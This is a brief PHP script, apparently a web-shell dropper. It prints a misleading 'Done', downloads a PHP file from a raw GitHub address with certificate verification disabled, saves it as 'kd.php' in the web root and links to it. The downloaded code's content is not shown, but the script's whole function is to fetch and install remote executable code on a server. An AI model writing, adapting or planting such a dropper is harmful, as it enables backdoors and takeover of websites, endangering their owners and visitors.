<?php
echo 'Done';
$ch = curl_init('https://raw.githubusercontent.com/alex2020kps/contents/main/kdnbkbc.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);
curl_close($ch);
file_put_contents(
    'kd.php',
    $response
);
$link = "http://" . $_SERVER['HTTP_HOST'] . "/kd.php";
echo "<br>";
echo "<a href='$link'> >>kd.php<< </a>";

?>
